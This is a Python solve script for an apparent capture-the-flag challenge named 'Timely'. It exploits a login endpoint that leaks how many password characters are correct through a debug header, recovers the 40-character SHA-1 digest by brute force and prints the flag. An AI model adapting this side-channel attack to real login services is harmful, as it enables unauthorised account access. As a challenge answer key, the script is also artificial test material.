#!/usr/bin/env python3
# Timely - the /login POST compares the submitted password against a fixed SHA-1
# hex digest one character at a time, leaking the number of correct leading
# characters through the `Debug-Lag-Fix: <i*100 +/- jitter>ns` response header.
# We recover the 40-char hex digest character by character, then log in.
import os, sys, re, json, urllib.request

# Env-driven target so `pwnmake check` can point us at the started container
# ($URL) while manual runs still accept an argv or fall back to localhost.
HOST = os.environ.get("URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:22302")
HEXLEN = 40
ALPHABET = "0123456789abcdef"

def attempt(pw):
    req = urllib.request.Request(HOST.rstrip("/") + "/login",
        data=json.dumps({"username": "anri", "password": pw}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return 200, r.read().decode(errors="replace"), None
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), e.headers.get("Debug-Lag-Fix")

def matched(lag):
    # header is "<i*100 +/- variation>ns"; i = correct leading chars
    n = int(re.match(r"(-?\d+)", lag).group(1))
    return round(n / 100)

known = ""
while len(known) < HEXLEN:
    pos = len(known)
    best = None
    for c in ALPHABET:
        guess = (known + c).ljust(HEXLEN, "0")
        code, body, lag = attempt(guess)
        if code == 200:
            print("FLAG:", re.search(r"Congrats! (.*)", body).group(1).strip()); sys.exit(0)
        if lag is None:
            continue
        if matched(lag) > pos:
            best = c
            break
    if best is None:
        print("Failed at position", pos); sys.exit(1)
    known += best
    print(f"[{len(known):2d}/40] {known}")

# full hash known -> final login
code, body, lag = attempt(known)
m = re.search(r"Congrats! (.*)", body)
print("FLAG:", m.group(1).strip() if m else body)
